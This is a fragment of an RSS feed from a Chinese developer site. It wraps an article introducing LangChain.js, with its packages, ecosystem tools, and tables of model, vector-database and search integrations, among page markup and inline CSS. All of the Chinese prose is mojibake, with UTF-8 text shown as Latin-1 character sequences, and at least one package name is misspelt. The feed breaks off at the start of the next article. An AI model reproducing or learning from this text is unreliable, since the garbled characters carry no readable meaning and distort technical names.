</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[LangChain.js]]></title>    <link>https://juejin.cn/post/7596934200581455908</link>    <guid>https://juejin.cn/post/7596934200581455908</guid>    <pubDate>2026-01-20T01:01:41.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7596934200581455908" data-draft-id="7596488155303034899" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="LangChain.js"/> <meta itemprop="keywords" content="å‰ç«¯,LangChain"/> <meta itemprop="datePublished" content="2026-01-20T01:01:41.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="åŒ—ä¸¶æ•…åŸ"/> <meta itemprop="url" content="https://juejin.cn/user/465848662767367"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            LangChain.js
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/465848662767367/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    åŒ—ä¸¶æ•…åŸ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T01:01:41.000Z" title="Tue Jan 20 2026 01:01:41 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    3
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">LangChain.js</h2>
<p>æ˜¯ LangChain ç”Ÿæ€ä¸‹çš„ JavaScript/TypeScript ç‰ˆæœ¬æ¡†æ¶ï¼Œä¸“æ³¨äºå¸®åŠ©å¼€å‘è€…å¿«é€Ÿæ„å»ºç”±å¤§è¯­è¨€æ¨¡å‹ï¼ˆLLMï¼‰é©±åŠ¨çš„åº”ç”¨ç¨‹åºï¼Œæ ¸å¿ƒç›®æ ‡æ˜¯ç®€åŒ– AI åº”ç”¨å¼€å‘æµç¨‹ï¼ŒåŒæ—¶ä¿è¯æŠ€æœ¯é€‰å‹çš„æœªæ¥å…¼å®¹æ€§ã€‚</p>
<p>ç”¨å‰ç«¯è§†è§’æ¥çœ‹çš„è¯ï¼Œ<strong>å®ƒå°±æ˜¯ç»™å‰ç«¯åš AI åº”ç”¨çš„ã€Œå·¥å…·ç®± + ç»„è£…æ‰‹å†Œã€</strong>ï¼šæˆ‘ä»¬å¹³æ—¶å†™å‰ç«¯ï¼Œä¼šç”¨ React/Vue è¿™ç±»æ¡†æ¶æ‹¼ UI ç»„ä»¶ï¼Œç”¨ axios å°è£…è¯·æ±‚ï¼Œç”¨ Next.js é€‚é…ä¸åŒè¿è¡Œç¯å¢ƒï¼›è€Œ LangChain.js å°±æ˜¯å¸®ä½ ã€Œæ‹¼ AI åŠŸèƒ½ã€çš„å·¥å…·ï¼šä¸ç”¨ä»é›¶å†™ â€œè°ƒç”¨ ChatGPT / é€šä¹‰åƒé—®â€â€œè®© AI è¯» PDF/Notion æ–‡æ¡£â€â€œè®© AI è”ç½‘æœä¿¡æ¯â€ è¿™äº›é€»è¾‘ï¼Œå®ƒæŠŠè¿™äº›èƒ½åŠ›åšæˆäº†ç°æˆçš„ â€œAI ç»„ä»¶â€ï¼Œä½ åƒæ­ç§¯æœ¨ä¸€æ ·æ‹¼èµ·æ¥ï¼Œå°±èƒ½å¿«é€Ÿåšå‡ºæœ‰å®é™…ç”¨é€”çš„ AI åº”ç”¨ï¼ˆæ¯”å¦‚æ™ºèƒ½æ–‡æ¡£é—®ç­”ã€AI åŠ©æ‰‹ã€å†…å®¹æ€»ç»“å·¥å…·ç­‰ï¼‰ã€‚</p>
<p><code>æœ€æ–°çš„langchainjsè¦æ±‚Node.js 20+</code></p>
<h3 data-id="heading-1">langchainjsçš„ä¸€äº›åŒ…åˆ†ç±»è¯´æ˜</h3>
<h4 data-id="heading-2">å®˜æ–¹åŒ…åˆ†ç±»ä»‹ç»</h4>

























<table><thead><tr><th>åŒ…å</th><th>åŠŸèƒ½è¯´æ˜</th></tr></thead><tbody><tr><td>langchain</td><td>ä¸»åŒ…ï¼Œå¯¹å¤–æš´éœ²çš„ä¸»å…¥å£ã€‚åŒ…å«æ™ºèƒ½ä½“ã€æç¤ºè¯ã€ç¼–æ’æ ¸å¿ƒé€»è¾‘</td></tr><tr><td>@langchain/core</td><td>åº•å±‚æŠ½è±¡æ¥å£ï¼ˆå®šä¹‰ AI è°ƒç”¨ã€å·¥å…·æ‰©å±•çš„åŸºç¡€è§„åˆ™ï¼‰</td></tr><tr><td>@langchain/community</td><td>ç¤¾åŒºç»´æŠ¤çš„ç¬¬ä¸‰æ–¹é›†æˆï¼ˆæ–‡æ¡£åŠ è½½ã€å­˜å‚¨ç­‰ï¼‰</td></tr><tr><td>@langchain/*</td><td>å®˜æ–¹é€‚é…åŒ…ï¼ˆå¯¹æ¥ OpenAI/Anthropic/ ç™¾åº¦ç­‰ AI å‚å•†ã€Weaviate å‘é‡åº“ï¼‰</td></tr></tbody></table>
<h4 data-id="heading-3">langchainçš„ä¸€äº›æ ¸å¿ƒåŠŸèƒ½ä»‹ç»</h4>






























<table><thead><tr><th>LangChain.js åŠŸèƒ½</th><th>å‰ç«¯ç±»æ¯”</th><th>å®é™…ç”¨é€”ä¸¾ä¾‹</th></tr></thead><tbody><tr><td>æ–‡æ¡£åŠ è½½å™¨</td><td>å‰ç«¯çš„ FileReader / ä¸Šä¼ è§£æç»„ä»¶</td><td>è®© AI è¯»å– PDF/Notion/GitHub æ–‡æ¡£</td></tr><tr><td>å·¥å…·ï¼ˆToolï¼‰</td><td>å‰ç«¯çš„è‡ªå®šä¹‰ Hookï¼ˆå°è£…å°åŠŸèƒ½ï¼‰</td><td>ç»™ AI åŠ  â€œè®¡ç®—å™¨ / ç½‘é¡µæœç´¢ / è°ƒä¼ä¸š APIâ€ èƒ½åŠ›</td></tr><tr><td>æ™ºèƒ½ä½“ï¼ˆAgentï¼‰</td><td>å‰ç«¯çš„çŠ¶æ€ç®¡ç†ï¼ˆæ¯”å¦‚ Reduxï¼‰</td><td>è®© AI è‡ªå·±åˆ¤æ–­ â€œè¯¥ç”¨å“ªä¸ªå·¥å…·â€ï¼ˆæ¯”å¦‚é—®è¥æ”¶å°±è°ƒç”¨æœç´¢å·¥å…·ï¼‰</td></tr><tr><td>å­˜å‚¨å±‚ï¼ˆå‘é‡ / å¯¹è¯å­˜å‚¨</td><td>å‰ç«¯çš„ localStorageç­‰ç¼“å­˜</td><td>å­˜ AI å¯¹è¯è®°å½•ã€å­˜æ–‡æ¡£çš„ â€œAI å¯ç†è§£ç‰ˆâ€ï¼ˆæ–¹ä¾¿å¿«é€Ÿæœç´¢ï¼‰</td></tr></tbody></table>
<h4 data-id="heading-4">ç”Ÿæ€ç³»ç»Ÿ</h4>
<h5 data-id="heading-5">LangSmith</h5>
<p>LangSmith æ˜¯<strong>AI ç‰ˆçš„ â€œå‰ç«¯è°ƒè¯• / ç›‘æ§å·¥å…·â€</strong> ï¼ˆç®¡ AIâ€œåšå¾—å¯¹ä¸å¯¹ã€å¿«ä¸å¿«â€ï¼‰ã€‚</p>
<h5 data-id="heading-6">LangGraph</h5>
<p>LangGraph æ˜¯<strong>AI ç‰ˆçš„ â€œå‰ç«¯æµç¨‹ç¼–æ’å·¥å…·â€</strong> ï¼ˆç®¡ AI â€œæ€ä¹ˆåšäº‹â€ï¼‰ã€‚</p>
<p>ä¿©éƒ½æ˜¯ LangChain.js ç”Ÿæ€çš„ â€œé…å¥—å·¥å…·â€ï¼Œå°±åƒ Reactï¼ˆLangChain.jsï¼‰æ­é… <a href="https://link.juejin.cn?target=https%3A%2F%2Fxstate.nodejs.cn%2F" target="_blank" title="https://xstate.nodejs.cn/" ref="nofollow noopener noreferrer">XState</a>ï¼ˆLangGraphï¼‰+ Sentryï¼ˆLangSmithï¼‰ä¸€æ ·ï¼Œå„å¸å…¶èŒã€‚</p>
<h4 data-id="heading-7">å®˜æ–¹é€‚é…åŒ…</h4>
<h5 data-id="heading-8">ä¸€ï¼ŒLLM / èŠå¤©æ¨¡å‹é€‚é…åŒ…ï¼ˆå¯¹æ¥å„ç±»å¤§æ¨¡å‹ï¼‰</h5>































































































<table><thead><tr><th>åŒ…å</th><th>æ ¸å¿ƒå®šä½</th><th>å…³é”®èƒ½åŠ› / å¯¼å‡ºå†…å®¹</th><th>é€‚ç”¨åœºæ™¯</th></tr></thead><tbody><tr><td>langchain-anthropic</td><td>å¯¹æ¥ Anthropicï¼ˆClaudeï¼‰ç³»åˆ—æ¨¡å‹</td><td>1ï¼ŒèŠå¤©æ¨¡å‹ç±»ï¼ˆChatAnthropicï¼‰ 2ï¼Œ æç¤ºè¯è½¬æ¢å·¥å…· 3ï¼Œå¤šç±»å·¥å…·ï¼ˆç½‘é¡µæœç´¢ã€ä»£ç æ‰§è¡Œã€æ–‡æœ¬ç¼–è¾‘ç­‰ï¼‰</td><td>è°ƒç”¨ Claude æ¨¡å‹åšé•¿æ–‡æœ¬å¯¹è¯ã€å·¥å…·è°ƒç”¨ï¼ˆå¦‚æ•°æ®åˆ†æã€ç½‘é¡µæŠ“å–ï¼‰</td></tr><tr><td>langchain-aws</td><td>å¯¹æ¥ AWS ç”Ÿæ€ AI æœåŠ¡</td><td>1ï¼ŒèŠå¤©æ¨¡å‹ç±» 2ï¼ŒåµŒå…¥æ¨¡å‹ 3ï¼Œæ£€ç´¢å™¨ç›¸å…³å·¥å…·</td><td>è°ƒç”¨ AWS Bedrock ç­‰å¹³å°çš„ AI æ¨¡å‹ã€åŸºäº AWS åšæ£€ç´¢å¢å¼ºç”Ÿæˆï¼ˆRAGï¼‰</td></tr><tr><td>langchain-baidu-qianfan</td><td>å¯¹æ¥ç™¾åº¦åƒå¸†å¤§æ¨¡å‹å¹³å°</td><td>1ï¼ŒèŠå¤©æ¨¡å‹ç±» 2ï¼ŒåµŒå…¥æ¨¡å‹</td><td>è°ƒç”¨ç™¾åº¦åƒå¸†çš„å„ç±»å¤§æ¨¡å‹ã€ç”Ÿæˆæ–‡æœ¬åµŒå…¥å‘é‡</td></tr><tr><td>langchain-cerebras</td><td>å¯¹æ¥ Cerebras å¤§æ¨¡å‹</td><td>å¯¼å‡ºèŠå¤©æ¨¡å‹ç±»</td><td>è°ƒç”¨ Cerebras å¹³å°çš„å¤§æ¨¡å‹è¿›è¡Œå¯¹è¯ç”Ÿæˆ</td></tr><tr><td>langchain-cohere</td><td>å¯¹æ¥ Cohere å¤§æ¨¡å‹</td><td>1ï¼ŒèŠå¤©æ¨¡å‹ / LLM ç±» 2ï¼ŒåµŒå…¥æ¨¡å‹ 3ï¼Œæ£€ç´¢ç»“æœé‡æ’åºï¼ˆrerankï¼‰å·¥å…·</td><td>æ–‡æœ¬ç”Ÿæˆã€è¯­ä¹‰åµŒå…¥ã€RAG åœºæ™¯ä¸‹ä¼˜åŒ–æ£€ç´¢ç»“æœ</td></tr><tr><td>langchain-google-common</td><td>Google ç³»æœåŠ¡æ ¸å¿ƒé€‚é…å±‚</td><td>1ï¼Œ èŠå¤©æ¨¡å‹ / LLM / åµŒå…¥æ¨¡å‹ 2ï¼Œé‰´æƒ / è¿æ¥å·¥å…· 3ï¼Œå®‰å…¨ç­–ç•¥ã€æµå¼å“åº”å¤„ç†å·¥å…·</td><td>ä¸º Google GenAI/Vertex AI æä¾›é€šç”¨èƒ½åŠ›ï¼Œæ”¯æŒå¤šæ¨¡æ€è¾“å…¥ã€å®‰å…¨é…ç½®</td></tr><tr><td>langchain-google-genai</td><td>å¯¹æ¥ Google Gemini æ¨¡å‹</td><td>1ï¼ŒèŠå¤©æ¨¡å‹ç±» 2ï¼ŒåµŒå…¥æ¨¡å‹</td><td>ç›´æ¥è°ƒç”¨ Gemini é€šç”¨å¤§æ¨¡å‹ã€ç”Ÿæˆæ–‡æœ¬åµŒå…¥å‘é‡</td></tr><tr><td>langchain-google-vertexai</td><td>å¯¹æ¥ Google Vertex AI å¹³å°</td><td>é€‚é…æœåŠ¡ç«¯é‰´æƒçš„ Google æ¨¡å‹è°ƒç”¨èƒ½åŠ›</td><td>åŸºäº GCP æœåŠ¡è´¦å·è°ƒç”¨ Vertex AI æ‰˜ç®¡çš„ Gemini ç­‰æ¨¡å‹</td></tr><tr><td>langchain-mistralai</td><td>å¯¹æ¥ Mistral AI æ¨¡å‹</td><td>1ï¼ŒèŠå¤©æ¨¡å‹ / LLM ç±» 2ï¼ŒåµŒå…¥æ¨¡å‹</td><td>è°ƒç”¨ Mistral Large/Codestral æ¨¡å‹åšé€šç”¨æ–‡æœ¬ç”Ÿæˆã€ä»£ç è¡¥å…¨</td></tr><tr><td>langchain-nomic</td><td>å¯¹æ¥ Nomic åµŒå…¥æ¨¡å‹</td><td>ä»…å¯¼å‡ºåµŒå…¥æ¨¡å‹ç›¸å…³å†…å®¹</td><td>ç”Ÿæˆ Nomic ä½“ç³»çš„æ–‡æœ¬åµŒå…¥å‘é‡</td></tr><tr><td>langchain-ollama</td><td>å¯¹æ¥æœ¬åœ° / ç§æœ‰éƒ¨ç½²çš„ Ollama æ¨¡å‹</td><td>1ï¼ŒèŠå¤©æ¨¡å‹ / LLM ç±» 2ï¼ŒåµŒå…¥æ¨¡å‹ 3ï¼Œ ç±»å‹å®šä¹‰</td><td>æ— éœ€è”ç½‘ï¼Œè°ƒç”¨æœ¬åœ°éƒ¨ç½²çš„ Llama 3/Phi/Mistral ç­‰æ¨¡å‹ï¼ˆéšç§ä¼˜å…ˆåœºæ™¯ï¼‰</td></tr><tr><td>angchain-openai</td><td>å¯¹æ¥ OpenAI/Azure OpenAI æ ¸å¿ƒåŒ…</td><td>1ï¼Œ ChatGPT/GPT-4 èŠå¤©æ¨¡å‹ 2ï¼ŒLLM ç±» / åµŒå…¥æ¨¡å‹ 3ï¼ŒAzure OpenAI å…¨é€‚é… 4ï¼Œå·¥å…·è°ƒç”¨èƒ½åŠ›</td><td>è°ƒç”¨ OpenAI åŸç”Ÿæ¨¡å‹ã€Azure æ‰˜ç®¡çš„ OpenAI æ¨¡å‹ã€ç”ŸæˆåµŒå…¥å‘é‡ã€å·¥å…·è°ƒç”¨</td></tr><tr><td>langchain-xai</td><td>å¯¹æ¥ XAI ç›¸å…³æœåŠ¡</td><td>å¯¼å‡ºå®æ—¶æœç´¢å·¥å…·ï¼ˆxaiLiveSearchï¼‰</td><td>åŸºäº XAI æœåŠ¡åšå®æ—¶ç½‘ç»œæœç´¢ã€è¡¥å…… RAG åœºæ™¯çš„å®æ—¶ä¿¡æ¯</td></tr><tr><td>langchain-yandex</td><td>å¯¹æ¥ Yandex GPT æ¨¡å‹</td><td>1ï¼ŒèŠå¤©æ¨¡å‹ / LLM ç±» 2ï¼ŒåµŒå…¥æ¨¡å‹ 3ï¼Œæ”¯æŒ Api-Key/IAM Token åŒé‰´æƒ</td><td>è°ƒç”¨ Yandex äº‘å¹³å°çš„ GPT æ¨¡å‹ï¼ˆä¿„è¯­ / å¤šè¯­è¨€åœºæ™¯ä¼˜åŠ¿ï¼‰</td></tr></tbody></table>
<h5 data-id="heading-9">äºŒï¼Œå‘é‡æ•°æ®åº“é€‚é…åŒ…ï¼ˆå¯¹æ¥å„ç±»å‘é‡å­˜å‚¨ï¼‰</h5>









































<table><thead><tr><th>åŒ…å</th><th>æ ¸å¿ƒå®šä½</th><th>å…³é”®èƒ½åŠ› / å¯¼å‡ºå†…å®¹</th><th>é€‚ç”¨åœºæ™¯</th></tr></thead><tbody><tr><td>langchain-pinecone</td><td>å¯¹æ¥ Pinecone å‘é‡æ•°æ®åº“</td><td>1ï¼Œå‘é‡å­˜å‚¨æ“ä½œç±» 2ï¼Œ ç¿»è¯‘å·¥å…· 3ï¼ŒåµŒå…¥æ¨¡å‹</td><td>äº‘ç«¯å‘é‡å­˜å‚¨ã€å¤§è§„æ¨¡ RAG åœºæ™¯çš„æ£€ç´¢</td></tr><tr><td>langchain-qdrant</td><td>å¯¹æ¥ Qdrant å‘é‡æ•°æ®åº“</td><td>å‘é‡å­˜å‚¨æ“ä½œç±»ï¼ˆä»£ç åº“é…ç½®å¼•ç”¨ï¼Œæ— å…·ä½“å¯¼å‡ºï¼‰</td><td>è½»é‡å‘é‡å­˜å‚¨ã€æœ¬åœ° / äº‘ç«¯æ··åˆéƒ¨ç½²çš„ RAG åœºæ™¯</td></tr><tr><td>langchain-redis</td><td>å¯¹æ¥ Redis å‘é‡å­˜å‚¨</td><td>å‘é‡å­˜å‚¨æ“ä½œç±»ï¼ˆä»£ç åº“é…ç½®å¼•ç”¨ï¼‰</td><td>ç¼“å­˜ + å‘é‡å­˜å‚¨ä¸€ä½“åŒ–ã€ä½å»¶è¿Ÿçš„æ£€ç´¢åœºæ™¯</td></tr><tr><td>langchain-weaviate</td><td>å¯¹æ¥ Weaviate å‘é‡æ•°æ®</td><td>1ï¼Œå‘é‡å­˜å‚¨æ“ä½œç±» 2ï¼Œç¿»è¯‘å·¥å…·</td><td>è¯­ä¹‰æ£€ç´¢ã€ç»“åˆçŸ¥è¯†å›¾è°±çš„å‘é‡æ£€ç´¢åœºæ™¯</td></tr><tr><td>langchain-mongodb</td><td>å¯¹æ¥ MongoDB ç”Ÿæ€</td><td>1ï¼Œå‘é‡å­˜å‚¨ 2ï¼ŒèŠå¤©è®°å½•å­˜å‚¨ 3ï¼Œç¼“å­˜ / é€šç”¨å­˜å‚¨</td><td>MongoDB ä¸­å­˜å‚¨å‘é‡ã€èŠå¤©å†å²ï¼Œåšä¸€ä½“åŒ–æ•°æ®ç®¡ç†</td></tr></tbody></table>
<h5 data-id="heading-10">ä¸‰ï¼Œå·¥å…· / å…¶ä»–æœåŠ¡é€‚é…åŒ…</h5>





























<table><thead><tr><th>åŒ…å</th><th>æ ¸å¿ƒå®šä½</th><th>å…³é”®èƒ½åŠ› / å¯¼å‡ºå†…å®¹</th><th>é€‚ç”¨åœºæ™¯</th></tr></thead><tbody><tr><td>langchain-exa</td><td>å¯¹æ¥ Exa æœç´¢å·¥å…·</td><td>å¯¼å‡ºæ£€ç´¢å™¨ã€å·¥å…·ç±»</td><td>ç²¾å‡†ç½‘é¡µå†…å®¹æ£€ç´¢ã€æ·±åº¦çˆ¬å–ï¼Œè¡¥å…… RAG ä¿¡æ¯</td></tr><tr><td>langchain-mixedbread-ai</td><td>å¯¹æ¥ Mixedbread AI æœåŠ¡</td><td>1ï¼ŒåµŒå…¥æ¨¡å‹ 2ï¼Œ é‡æ’åºå·¥å…·</td><td>ç”Ÿæˆæ–‡æœ¬åµŒå…¥å‘é‡ã€ä¼˜åŒ–æ£€ç´¢ç»“æœæ’åº</td></tr><tr><td>langchain-tavily</td><td>å¯¹æ¥ Tavily æœç´¢å·¥å…·</td><td>æœç´¢å·¥å…·ç±»ï¼ˆä»£ç åº“é…ç½®å¼•ç”¨ï¼‰</td><td>å®æ—¶ç½‘ç»œæœç´¢ã€ä¸º LLM è¡¥å……æœ€æ–°å¤–éƒ¨ä¿¡æ¯</td></tr></tbody></table></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[jQuery 4.0 å‘å¸ƒï¼šæ˜¯å¦ä»å€¼å¾—ä½¿ç”¨ï¼Ÿ]]></title>    <link>https://juejin.cn/post/7596906473307111474</link>    <guid>https://juejin.cn/post/7596906473307111474</guid>    <pubDate>2026-01-20T01:19:40.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7596906473307111474" data-draft-id="7596983314805702706" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="jQuery 4.0 å‘å¸ƒï¼šæ˜¯å¦ä»å€¼å¾—ä½¿ç”¨ï¼Ÿ"/> <meta itemprop="keywords" content="å‰ç«¯,JavaScript"/> <meta itemprop="datePublished" content="2026-01-20T01:19:40.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ©™åºå‘˜å°ç«™"/> <meta itemprop="url" content="https://juejin.cn/user/1546375522426169"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 